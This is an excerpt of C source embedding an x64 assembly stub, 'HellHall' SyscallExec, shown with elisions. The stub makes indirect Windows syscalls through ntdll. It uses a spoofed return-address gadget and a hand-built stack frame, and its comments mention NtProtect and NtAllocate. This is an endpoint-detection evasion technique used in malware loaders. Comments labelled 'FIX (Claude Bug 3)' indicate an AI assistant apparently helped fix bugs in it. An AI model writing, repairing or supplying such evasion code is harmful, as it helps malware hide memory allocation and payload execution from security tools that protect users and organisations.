...
const char *g_HellHallAsm =
    ...
    "        mov r11, rax\n"
    "\n"
    "        ; 1. PERFECT FRAME: We do NOT pop the Legit Return Address.\n"
    "        ; We allocate exactly (qFrameSize - 8) below it.\n"
    "        ; Pushing the gadget later will complete the precise qFrameSize "
    "offset.\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        sub rax, 8\n"
    "        sub rsp, rax\n"
    "\n"
    "        ; 2. Save RSI/RDI safely in the new Shadow Space\n"
    "        mov [rsp + 8h], rsi\n"
    "        mov [rsp + 10h], rdi\n"
    "\n"
    "        ; 3. Copy Stack Arguments (Arg5+)\n"
    "        ; Source: Old RSP (RSP + rax) + 28h\n"
    "        lea rsi, [rsp + rax + 28h]\n"
    "        lea rdi, [rsp + 20h]\n"
    "        ; We copy exactly 2 QWORDs (16 bytes) to prevent Buffer Overflow "
    "\n"
    "        ; in small frames (like 0x38). This fully covers NtProtect & "
    "NtAllocate.\n"
    "        mov rcx, 2\n"
    "        cld\n"
    "        rep movsq\n"
    ...
    "        jmp DoCall\n"
    "    UseRDI:\n"
    "        ; FIX (Claude Bug 3): Recover pre-movsq RDI from shadow space\n"
    "        mov rdi, [rsp + 10h]\n"
    "        mov qSavedReg, rdi\n"
    "        lea rdi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRSI:\n"
    "        ; FIX (Claude Bug 3): Recover pre-movsq RSI from shadow space\n"
    "        mov rsi, [rsp + 8h]\n"
    "        mov qSavedReg, rsi\n"
    ...
    "        push qGadgetAddress  ; RSP drops by 8, aligning perfectly with "
    "Unwinder logic\n"
    "        jmp r11              ; Jump into ntdll\n"
    "\n"
    "    BackFromKernel:\n"
    "        ; The 'ret' in ntdll popped the gadget address. RSP is "
    ...
    "        mov rsi, [rsp + 8h] ; Restore registers from Shadow Space\n"
    "        mov rdi, [rsp + 10h]\n"
    "        \n"
    "        ; Revert the initial allocation\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        sub rax, 8\n"
    "        add rsp, rax\n"
    ...
    "        ret                 ; Returns naturally, leaving ZERO trailing "
    "bytes\n"
    "    SyscallExec ENDP\n";
